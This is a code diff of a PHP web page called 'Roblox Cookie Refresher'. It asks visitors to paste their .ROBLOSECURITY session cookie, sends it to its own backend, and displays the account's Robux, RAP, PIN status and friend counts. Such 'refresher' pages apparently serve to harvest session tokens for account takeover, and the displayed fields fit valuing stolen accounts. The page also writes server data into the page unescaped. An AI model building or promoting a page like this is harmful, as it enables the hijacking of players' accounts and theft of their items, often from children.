@@ -89,365 +89,355 @@ $username = htmlspecialchars($user['username'], ENT_QUOTES, 'UTF-8');
             justify-content: space-between;
             align-items: center;
             box-shadow: 0 26px 80px rgba(0, 0, 0, 0.62);
-            margin-bottom: 24px;
-            backdrop-filter: blur(10px);
+            margin-bottom: 32px;
         }
 
-        .nav-brand {
+        .nav-left {
             display: flex;
             align-items: center;
-            gap: 12px;
-        }
-
-        .nav-logo {
-            width: 42px;
-            height: 42px;
-            border-radius: 12px;
-            display: grid;
-            place-items: center;
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(140, 190, 255, 0.18);
-        }
-
-        .nav-logo svg {
-            width: 18px;
-            height: 18px;
-            color: var(--accent-blue);
-        }
-
-        .nav-title {
-            font-size: 18px;
-            font-weight: 600;
-            letter-spacing: -0.01em;
-        }
-
-        .user-info {
-            display: flex;
-            align-items: center;
-            gap: 12px;
+            gap: 14px;
         }
 
         .user-avatar {
             width: 42px;
             height: 42px;
             border-radius: 50%;
-            border: 2px solid var(--accent-blue);
-            object-fit: cover;
+            border: 2px solid var(--card-border);
+        }
+
+        .user-info {
+            display: flex;
+            flex-direction: column;
         }
 
         .user-name {
-            font-size: 14px;
             font-weight: 600;
-            display: none;
+            font-size: 15px;
+            color: var(--text-primary);
+        }
+
+        .user-status {
+            font-size: 13px;
+            color: var(--text-secondary);
+        }
+
+        .logout-btn {
+            background: rgba(240, 85, 85, 0.1);
+            color: var(--error);
+            border: 1px solid rgba(240, 85, 85, 0.2);
+            padding: 10px 20px;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        .logout-btn:hover {
+            background: rgba(240, 85, 85, 0.15);
+            border-color: rgba(240, 85, 85, 0.3);
         }
 
         /* Main Card */
-        .card {
-            width: 100%;
-            border-radius: 18px;
-            border: 1px solid var(--card-border);
+        .main-card {
             background: linear-gradient(180deg, var(--card-bg), rgba(255, 255, 255, 0.045));
+            border: 1px solid var(--card-border);
+            border-radius: 20px;
+            padding: 36px;
             box-shadow: 0 26px 80px rgba(0, 0, 0, 0.62);
-            padding: 28px;
-            position: relative;
-            overflow: hidden;
-            backdrop-filter: blur(10px);
-        }
-
-        .card::before {
-            content: "";
-            position: absolute;
-            inset: -2px;
-            background: radial-gradient(520px 180px at 40% 0%, rgba(124, 182, 255, 0.12), transparent 60%);
-            opacity: 0.55;
-            pointer-events: none;
-        }
-
-        .card-content {
-            position: relative;
-            z-index: 1;
-        }
-
-        /* Card Header */
-        .card-header {
             margin-bottom: 24px;
+        }
+
+        .card-header {
+            text-align: center;
+            margin-bottom: 32px;
         }
 
         .card-title {
-            margin-bottom: 6px;
-            font-size: 24px;
+            font-size: 28px;
             font-weight: 600;
+            letter-spacing: -0.02em;
+            margin-bottom: 8px;
+            background: linear-gradient(135deg, var(--accent-blue), var(--accent-blue-light));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
         }
 
-        .card-desc {
-            font-size: 14px;
+        .card-subtitle {
             color: var(--text-secondary);
-            line-height: 1.5;
-        }
-
-        /* Form */
-        .form-group {
-            margin-bottom: 20px;
-        }
-
-        .label {
-            display: block;
-            margin-bottom: 10px;
-            font-size: 13px;
-            font-weight: 500;
-            color: rgba(255, 255, 255, 0.7);
-        }
-
-        .input {
-            width: 100%;
-            height: 52px;
-            border-radius: 12px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            background: rgba(0, 0, 0, 0.22);
-            color: var(--text-primary);
-            padding: 0 16px;
-            font-size: 14px;
-            outline: none;
-            transition: all 0.2s ease;
-        }
-
-        .input::placeholder {
-            color: rgba(255, 255, 255, 0.34);
-        }
-
-        .input:focus {
-            border-color: rgba(124, 182, 255, 0.35);
-            background: rgba(0, 0, 0, 0.3);
-        }
-
-        /* Button */
-        .btn {
-            width: 100%;
-            height: 54px;
-            border-radius: 14px;
-            border: 1px solid rgba(124, 182, 255, 0.26);
-            background: linear-gradient(135deg, rgba(124, 182, 255, 0.25), rgba(124, 182, 255, 0.15));
-            color: var(--text-primary);
-            font-weight: 600;
             font-size: 15px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            box-shadow: 0 16px 40px rgba(0, 0, 0, 0.38);
-            transition: all 0.2s ease;
         }
 
-        .btn:hover:not(:disabled) {
-            background: linear-gradient(135deg, rgba(124, 182, 255, 0.35), rgba(124, 182, 255, 0.25));
-            border-color: rgba(124, 182, 255, 0.4);
-            transform: translateY(-2px);
-            box-shadow: 0 20px 48px rgba(0, 0, 0, 0.48);
-        }
-
-        .btn:active {
-            transform: translateY(0);
-        }
-
-        .btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-
-        .btn svg {
-            width: 18px;
-            height: 18px;
-        }
-
-        /* Modal */
-        .modal {
-            position: fixed;
-            inset: 0;
-            display: none;
-            z-index: 1000;
-        }
-
-        .modal[data-visible="true"] {
-            display: block;
-        }
-
-        .modal-backdrop {
-            position: absolute;
-            inset: 0;
-            background: rgba(0, 0, 0, 0.75);
-            backdrop-filter: blur(6px);
-        }
-
-        .modal-box {
-            position: relative;
-            max-width: 720px;
-            max-height: 90vh;
-            overflow-y: auto;
-            margin: 5vh auto 0;
-            background: linear-gradient(180deg, var(--card-bg), rgba(255, 255, 255, 0.045));
-            border: 1px solid var(--card-border);
-            border-radius: 16px;
-            box-shadow: 0 26px 80px rgba(0, 0, 0, 0.62);
-            padding: 28px;
-        }
-
-        .modal-title {
-            margin-bottom: 20px;
-            color: var(--accent-blue-light);
-            font-weight: 600;
-            font-size: 22px;
-            text-align: center;
-        }
-
-        .modal-body {
-            color: var(--text-primary);
-            font-size: 14px;
-            line-height: 1.5;
-        }
-
-        /* Info Grid */
-        .info-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 14px;
+        /* Input Group */
+        .input-group {
             margin-bottom: 24px;
         }
 
-        .info-item {
-            background: rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            border-radius: 12px;
-            padding: 14px;
-        }
-
-        .info-label {
-            font-size: 11px;
-            text-transform: uppercase;
-            letter-spacing: 0.6px;
-            color: var(--text-secondary);
-            margin-bottom: 8px;
+        .input-label {
+            display: block;
+            font-size: 14px;
             font-weight: 500;
+            color: var(--text-secondary);
+            margin-bottom: 10px;
         }
 
-        .info-value {
-            font-size: 16px;
-            font-weight: 600;
-        }
-
-        /* Cookie Section */
-        .cookie-section {
-            background: rgba(0, 0, 0, 0.4);
+        .input-field {
+            width: 100%;
+            background: rgba(255, 255, 255, 0.04);
             border: 1px solid var(--card-border);
             border-radius: 12px;
-            padding: 18px;
+            padding: 14px 16px;
+            color: var(--text-primary);
+            font-size: 14px;
+            font-family: 'Courier New', monospace;
+            transition: all 0.2s;
+            resize: vertical;
+            min-height: 120px;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: var(--accent-blue);
+            background: rgba(255, 255, 255, 0.06);
+        }
+
+        .input-field::placeholder {
+            color: rgba(255, 255, 255, 0.3);
+        }
+
+        /* Button */
+        .refresh-btn {
+            width: 100%;
+            background: linear-gradient(135deg, var(--accent-blue), #5A9EE8);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 8px 24px rgba(124, 182, 255, 0.3);
+        }
+
+        .refresh-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 32px rgba(124, 182, 255, 0.4);
+        }
+
+        .refresh-btn:active {
+            transform: translateY(0);
+        }
+
+        .refresh-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Result Card */
+        .result-card {
+            display: none;
+            background: linear-gradient(180deg, var(--card-bg), rgba(255, 255, 255, 0.045));
+            border: 1px solid var(--card-border);
+            border-radius: 16px;
+            padding: 24px;
             margin-top: 24px;
         }
 
-        .cookie-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 12px;
+        .result-card.show {
+            display: block;
+            animation: slideIn 0.3s ease;
         }
 
-        .cookie-header h4 {
-            margin: 0;
-            font-size: 15px;
-            color: var(--accent-blue-light);
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .result-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 16px;
+        }
+
+        .result-icon {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+        }
+
+        .result-icon.success {
+            background: rgba(41, 194, 127, 0.2);
+            color: var(--success);
+        }
+
+        .result-icon.error {
+            background: rgba(240, 85, 85, 0.2);
+            color: var(--error);
+        }
+
+        .result-title {
             font-weight: 600;
+            font-size: 16px;
+        }
+
+        .result-content {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 10px;
+            padding: 16px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            word-break: break-all;
+            color: var(--text-secondary);
+            margin-bottom: 12px;
+            max-height: 200px;
+            overflow-y: auto;
         }
 
         .copy-btn {
-            height: 34px;
-            padding: 0 16px;
+            background: rgba(124, 182, 255, 0.1);
+            color: var(--accent-blue);
+            border: 1px solid rgba(124, 182, 255, 0.2);
+            padding: 10px 20px;
             border-radius: 8px;
-            border: 1px solid rgba(124, 182, 255, 0.3);
-            background: rgba(124, 182, 255, 0.12);
-            color: var(--accent-blue-light);
+            font-size: 14px;
+            font-weight: 500;
             cursor: pointer;
-            font-size: 13px;
-            font-weight: 600;
-            transition: all 0.2s ease;
+            transition: all 0.2s;
+            width: 100%;
         }
 
         .copy-btn:hover {
-            background: rgba(124, 182, 255, 0.2);
-            border-color: rgba(124, 182, 255, 0.5);
+            background: rgba(124, 182, 255, 0.15);
+            border-color: rgba(124, 182, 255, 0.3);
         }
 
-        .copy-btn:active {
-            transform: scale(0.96);
+        /* User Data Grid */
+        .user-data-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 12px;
+            margin-top: 16px;
         }
 
-        .cookie-text {
-            font-family: 'Courier New', monospace;
-            font-size: 12px;
-            line-height: 1.6;
-            color: #d4e6ff;
-            word-break: break-all;
-            max-height: 140px;
-            overflow-y: auto;
-            padding: 12px;
-            background: rgba(0, 0, 0, 0.5);
+        .data-item {
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.06);
             border-radius: 10px;
+            padding: 12px;
         }
 
-        .modal-btn {
-            margin-top: 24px;
-            width: 100%;
-            height: 48px;
-            border-radius: 12px;
-            border: 1px solid rgba(124, 182, 255, 0.3);
-            background: rgba(10, 14, 24, 0.8);
-            color: var(--text-primary);
-            font-weight: 600;
-            cursor: pointer;
+        .data-label {
+            font-size: 12px;
+            color: var(--text-secondary);
+            margin-bottom: 4px;
+        }
+
+        .data-value {
             font-size: 14px;
-            transition: all 0.2s ease;
+            font-weight: 600;
+            color: var(--text-primary);
         }
 
-        .modal-btn:hover {
-            background: rgba(20, 28, 50, 0.9);
-            border-color: rgba(124, 182, 255, 0.5);
+        /* ================================================
+           LOADING OVERLAY - Blurred Background
+           ================================================ */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(7, 10, 18, 0.85);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+            opacity: 1;
+        }
+
+        .spinner {
+            width: 64px;
+            height: 64px;
+            border: 4px solid rgba(124, 182, 255, 0.15);
+            border-top-color: var(--accent-blue);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
 
         /* Footer */
         .footer {
-            margin-top: 28px;
             text-align: center;
-            font-size: 13px;
+            padding: 24px;
             color: var(--text-secondary);
-        }
-
-        .footer span {
-            color: var(--accent-blue-light);
-            font-weight: 500;
+            font-size: 14px;
         }
 
         /* Responsive */
-        @media (min-width: 640px) {
-            .user-name {
-                display: block;
-            }
-        }
-
-        @media (max-width: 640px) {
+        @media (max-width: 768px) {
             .navbar {
-                padding: 14px 16px;
+                flex-direction: column;
+                gap: 16px;
+                text-align: center;
             }
 
-            .nav-title {
-                font-size: 16px;
-            }
-
-            .card {
-                padding: 20px;
+            .main-card {
+                padding: 24px;
             }
 
             .card-title {
-                font-size: 20px;
+                font-size: 24px;
             }
+
+            .user-data-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: rgba(255, 255, 255, 0.02);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: rgba(124, 182, 255, 0.3);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: rgba(124, 182, 255, 0.5);
         }
     </style>
 </head>
@@ -455,254 +445,195 @@ $username = htmlspecialchars($user['username'], ENT_QUOTES, 'UTF-8');
     <div class="container">
         <!-- Navigation -->
         <nav class="navbar">
-            <div class="nav-brand">
-                <div class="nav-logo">
-                    <svg viewBox="0 0 24 24" fill="none">
-                        <path d="M12 2.5l7 3.6v6.2c0 5.1-3.1 9.1-7 10.7-3.9-1.6-7-5.6-7-10.7V6.1l7-3.6z" stroke="currentColor" stroke-width="1.6"/>
-                    </svg>
+            <div class="nav-left">
+                <img src="<?php echo $avatarUrl; ?>" alt="Avatar" class="user-avatar">
+                <div class="user-info">
+                    <div class="user-name"><?php echo $username; ?></div>
+                    <div class="user-status">Logged in with Discord</div>
                 </div>
-                <h1 class="nav-title">Roblox Cookie Refresher</h1>
             </div>
-            
-            <div class="user-info">
-                <span class="user-name"><?php echo $username; ?></span>
-                <img src="<?php echo htmlspecialchars($avatarUrl, ENT_QUOTES, 'UTF-8'); ?>" alt="User Avatar" class="user-avatar">
-            </div>
+            <a href="logout.php" class="logout-btn">Logout</a>
         </nav>
 
-        <!-- Main Content -->
-        <main class="card">
-            <div class="card-content">
-                <header class="card-header">
-                    <h2 class="card-title">Cookie Refresher</h2>
-                    <p class="card-desc">Paste your .ROBLOSECURITY cookie below to refresh it</p>
-                </header>
-
-                <form id="refreshForm">
-                    <div class="form-group">
-                        <label class="label" for="cookieInput">.ROBLOSECURITY Cookie</label>
-                        <input 
-                            type="text" 
-                            id="cookieInput" 
-                            name="cookie" 
-                            class="input" 
-                            placeholder="_|WARNING:-DO-NOT-SHARE-THIS..." 
-                            autocomplete="off"
-                            required
-                        >
-                    </div>
-
-                    <button type="submit" class="btn" id="refreshBtn">
-                        <svg viewBox="0 0 20 20" fill="currentColor">
-                            <path fill-rule="evenodd" d="M4 2a1 1 0 011 1v2.101a7.002 7.002 0 0111.601 2.566 1 1 0 11-1.885.666A5.002 5.002 0 005.999 7H9a1 1 0 010 2H4a1 1 0 01-1-1V3a1 1 0 011-1zm.008 9.057a1 1 0 011.276.61A5.002 5.002 0 0014.001 13H11a1 1 0 110-2h5a1 1 0 011 1v5a1 1 0 11-2 0v-2.101a7.002 7.002 0 01-11.601-2.566 1 1 0 01.61-1.276z" clip-rule="evenodd"/>
-                        </svg>
-                        Refresh Cookie
-                    </button>
-                </form>
+        <!-- Main Card -->
+        <div class="main-card">
+            <div class="card-header">
+                <h1 class="card-title">Cookie Refresher</h1>
+                <p class="card-subtitle">Enter your Roblox cookie to refresh it</p>
             </div>
-        </main>
 
-        <footer class="footer">
-            <span>Tip:</span> Share the Refresh tool to your friends
-        </footer>
-    </div>
+            <form id="refreshForm" onsubmit="refreshCookie(event)">
+                <div class="input-group">
+                    <label for="cookieInput" class="input-label">Roblox Cookie (.ROBLOSECURITY)</label>
+                    <textarea 
+                        id="cookieInput" 
+                        class="input-field" 
+                        placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_..."
+                        required
+                    ></textarea>
+                </div>
 
-    <!-- Result Modal -->
-    <div class="modal" id="resultModal" data-visible="false">
-        <div class="modal-backdrop" id="modalBackdrop"></div>
-        <div class="modal-box">
-            <h3 class="modal-title" id="modalTitle">Processing...</h3>
-            <div class="modal-body" id="modalBody"></div>
-            <button class="modal-btn" id="modalClose">Close</button>
+                <button type="submit" class="refresh-btn" id="refreshBtn">
+                    Refresh Cookie
+                </button>
+            </form>
+
+            <!-- Success Result -->
+            <div class="result-card" id="successResult">
+                <div class="result-header">
+                    <div class="result-icon success">✓</div>
+                    <div class="result-title">Cookie Refreshed Successfully!</div>
+                </div>
+                <div class="result-content" id="newCookie"></div>
+                <button class="copy-btn" onclick="copyCookie()">Copy to Clipboard</button>
+                
+                <!-- User Data -->
+                <div class="user-data-grid" id="userData"></div>
+            </div>
+
+            <!-- Error Result -->
+            <div class="result-card" id="errorResult">
+                <div class="result-header">
+                    <div class="result-icon error">✕</div>
+                    <div class="result-title">Error</div>
+                </div>
+                <div class="result-content" id="errorMessage"></div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            © 2026 Roblox Cookie Refresher. Made with ❤️
         </div>
     </div>
 
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+    </div>
+
     <script>
-        // Application State
-        const app = {
-            elements: {
-                form: document.getElementById('refreshForm'),
-                input: document.getElementById('cookieInput'),
-                button: document.getElementById('refreshBtn'),
-                modal: document.getElementById('resultModal'),
-                modalTitle: document.getElementById('modalTitle'),
-                modalBody: document.getElementById('modalBody'),
-                modalClose: document.getElementById('modalClose'),
-                backdrop: document.getElementById('modalBackdrop')
+        let refreshedCookie = '';
+
+        function showLoading() {
+            document.getElementById('loadingOverlay').classList.add('active');
+        }
+
+        function hideLoading() {
+            document.getElementById('loadingOverlay').classList.remove('active');
+        }
+
+        function showSuccess(data) {
+            document.getElementById('errorResult').classList.remove('show');
+            document.getElementById('successResult').classList.add('show');
+            document.getElementById('newCookie').textContent = data.cookie;
+            refreshedCookie = data.cookie;
+
+            // Display user data if available
+            if (data.userData) {
+                const userData = data.userData;
+                const userDataHtml = `
+                    <div class="data-item">
+                        <div class="data-label">Username</div>
+                        <div class="data-value">${userData.username || '—'}</div>
+                    </div>
+                    <div class="data-item">
+                        <div class="data-label">User ID</div>
+                        <div class="data-value">${userData.userId || '—'}</div>
+                    </div>
+                    <div class="data-item">
+                        <div class="data-label">Robux</div>
+                        <div class="data-value">${userData.robux || '0'}</div>
+                    </div>
+                    <div class="data-item">
+                        <div class="data-label">Premium</div>
+                        <div class="data-value">${userData.premium || '—'}</div>
+                    </div>
+                    <div class="data-item">
+                        <div class="data-label">Account Age</div>
+                        <div class="data-value">${userData.accountAge || '—'}</div>
+                    </div>
+                    <div class="data-item">
+                        <div class="data-label">Friends</div>
+                        <div class="data-value">${userData.friends || '0'}</div>
+                    </div>
+                `;
+                document.getElementById('userData').innerHTML = userDataHtml;
             }
-        };
-
-        /**
-         * Display modal with content
-         */
-        function showModal(title, content) {
-            app.elements.modalTitle.textContent = title;
-            app.elements.modalBody.innerHTML = content;
-            app.elements.modal.setAttribute('data-visible', 'true');
         }
 
-        /**
-         * Hide modal
-         */
-        function hideModal() {
-            app.elements.modal.setAttribute('data-visible', 'false');
+        function showError(message) {
+            document.getElementById('successResult').classList.remove('show');
+            document.getElementById('errorResult').classList.add('show');
+            document.getElementById('errorMessage').textContent = message;
         }
 
-        /**
-         * Format account information for display
-         */
-        function formatAccountInfo(data) {
-            const user = data.userData || {};
-            
-            const fields = {
-                username: user.username || '—',
-                userId: user.userId || '—',
-                robux: (user.robux !== undefined ? user.robux : '—').toLocaleString(),
-                pendingRobux: (user.pendingRobux !== undefined ? user.pendingRobux : '—').toLocaleString(),
-                rap: (user.rap !== undefined ? user.rap : '—').toLocaleString(),
-                summary: (user.summary !== undefined ? user.summary : '—').toLocaleString(),
-                premium: user.premium || '❓ Unknown',
-                voiceChat: user.voiceChat || '❓ Unknown',
-                pin: user.pin || '❓ Unknown',
-                accountAge: user.accountAge || '—',
-                friends: (user.friends !== undefined ? user.friends : '—').toLocaleString(),
-                followers: (user.followers !== undefined ? user.followers : '—').toLocaleString()
-            };
-
-            return `
-                <div class="info-grid">
-                    <div class="info-item">
-                        <div class="info-label">Username</div>
-                        <div class="info-value">${fields.username}</div>
-                    </div>
-                    <div class="info-item">
-                        <div class="info-label">User ID</div>
-                        <div class="info-value">${fields.userId}</div>
-                    </div>
-                    <div class="info-item">
-                        <div class="info-label">Robux</div>
-                        <div class="info-value">R$ ${fields.robux}</div>
-                    </div>
-                    <div class="info-item">
-                        <div class="info-label">Pending Robux</div>
-                        <div class="info-value">R$ ${fields.pendingRobux}</div>
-                    </div>
-                    <div class="info-item">
-                        <div class="info-label">RAP</div>
-                        <div class="info-value">R$ ${fields.rap}</div>
-                    </div>
-                    <div class="info-item">
-                        <div class="info-label">Summary</div>
-                        <div class="info-value">R$ ${fields.summary}</div>
-                    </div>
-                    <div class="info-item">
-                        <div class="info-label">Premium</div>
-                        <div class="info-value">${fields.premium}</div>
-                    </div>
-                    <div class="info-item">
-                        <div class="info-label">Voice Chat</div>
-                        <div class="info-value">${fields.voiceChat}</div>
-                    </div>
-                    <div class="info-item">
-                        <div class="info-label">PIN Enabled</div>
-                        <div class="info-value">${fields.pin}</div>
-                    </div>
-                    <div class="info-item">
-                        <div class="info-label">Account Age</div>
-                        <div class="info-value">${fields.accountAge}</div>
-                    </div>
-                    <div class="info-item">
-                        <div class="info-label">Friends</div>
-                        <div class="info-value">${fields.friends}</div>
-                    </div>
-                    <div class="info-item">
-                        <div class="info-label">Followers</div>
-                        <div class="info-value">${fields.followers}</div>
-                    </div>
-                </div>
-                
-                <div class="cookie-section">
-                    <div class="cookie-header">
-                        <h4>New Cookie</h4>
-                        <button class="copy-btn" onclick="copyToClipboard('${data.cookie || ''}', this)">Copy</button>
-                    </div>
-                    <div class="cookie-text">${data.cookie || 'N/A'}</div>
-                </div>
-            `;
-        }
-
-        /**
-         * Copy text to clipboard
-         */
-        function copyToClipboard(text, button) {
-            navigator.clipboard.writeText(text).then(() => {
-                const originalText = button.textContent;
-                button.textContent = 'Copied!';
-                setTimeout(() => {
-                    button.textContent = originalText;
-                }, 2000);
-            }).catch(err => {
-                console.error('Copy failed:', err);
-            });
-        }
-
-        /**
-         * Handle form submission
-         */
-        async function handleRefresh(event) {
+        async function refreshCookie(event) {
             event.preventDefault();
-            
-            const cookie = app.elements.input.value.trim();
-            
-            // Validate input
-            if (!cookie || cookie.length < 40) {
-                showModal('Invalid Cookie', '<p style="text-align:center;color:var(--text-secondary)">Please enter a valid .ROBLOSECURITY cookie (minimum 40 characters).</p>');
+
+            const cookieInput = document.getElementById('cookieInput').value.trim();
+            const refreshBtn = document.getElementById('refreshBtn');
+
+            if (!cookieInput) {
+                showError('Please enter a cookie');
                 return;
             }
-            
-            // Disable button
-            app.elements.button.disabled = true;
-            app.elements.button.textContent = 'Refreshing...';
-            
-            // Show processing modal
-            showModal('Refreshing Cookie...', '<p style="text-align:center;color:var(--text-secondary)">Please wait while we refresh your cookie and fetch account details...</p>');
-            
+
+            // Disable button and show loading
+            refreshBtn.disabled = true;
+            refreshBtn.textContent = 'Processing...';
+            showLoading();
+
             try {
                 const response = await fetch('/api/refresh.php', {
                     method: 'POST',
                     headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded'
+                        'Content-Type': 'application/x-www-form-urlencoded',
                     },
-                    body: 'cookie=' + encodeURIComponent(cookie)
+                    body: `cookie=${encodeURIComponent(cookieInput)}`
                 });
-                
+
                 const data = await response.json();
-                
-                if (!response.ok || data.error) {
-                    showModal('Error', `<p style="text-align:center;color:var(--error)">${data.error || 'Request failed'}</p>`);
-                    return;
+
+                hideLoading();
+
+                if (data.error) {
+                    showError(data.error);
+                } else {
+                    showSuccess(data);
                 }
-                
-                showModal('Cookie Refreshed Successfully! 🎉', formatAccountInfo(data));
-                
             } catch (error) {
-                showModal('Network Error', `<p style="text-align:center;color:var(--error)">${error.message}</p>`);
+                hideLoading();
+                showError('Network error. Please try again.');
+                console.error('Error:', error);
             } finally {
-                // Re-enable button
-                app.elements.button.disabled = false;
-                app.elements.button.innerHTML = `
-                    <svg viewBox="0 0 20 20" fill="currentColor" style="width:18px;height:18px">
-                        <path fill-rule="evenodd" d="M4 2a1 1 0 011 1v2.101a7.002 7.002 0 0111.601 2.566 1 1 0 11-1.885.666A5.002 5.002 0 005.999 7H9a1 1 0 010 2H4a1 1 0 01-1-1V3a1 1 0 011-1zm.008 9.057a1 1 0 011.276.61A5.002 5.002 0 0014.001 13H11a1 1 0 110-2h5a1 1 0 011 1v5a1 1 0 11-2 0v-2.101a7.002 7.002 0 01-11.601-2.566 1 1 0 01.61-1.276z" clip-rule="evenodd"/>
-                    </svg>
-                    Refresh Cookie
-                `;
+                refreshBtn.disabled = false;
+                refreshBtn.textContent = 'Refresh Cookie';
             }
         }
 
-        // Event Listeners
-        app.elements.form.addEventListener('submit', handleRefresh);
-        app.elements.modalClose.addEventListener('click', hideModal);
-        app.elements.backdrop.addEventListener('click', hideModal);
+        function copyCookie() {
+            if (!refreshedCookie) return;
+
+            navigator.clipboard.writeText(refreshedCookie).then(() => {
+                const btn = event.target;
+                const originalText = btn.textContent;
+                btn.textContent = 'Copied!';
+                btn.style.background = 'rgba(41, 194, 127, 0.2)';
+                btn.style.color = 'var(--success)';
+                btn.style.borderColor = 'rgba(41, 194, 127, 0.3)';
+
+                setTimeout(() => {
+                    btn.textContent = originalText;
+                    btn.style.background = 'rgba(124, 182, 255, 0.1)';
+                    btn.style.color = 'var(--accent-blue)';
+                    btn.style.borderColor = 'rgba(124, 182, 255, 0.2)';
+                }, 2000);
+            }).catch(err => {
+                showError('Failed to copy to clipboard');
+                console.error('Copy failed:', err);
+            });
+        }
     </script>
 </body>
 </html>
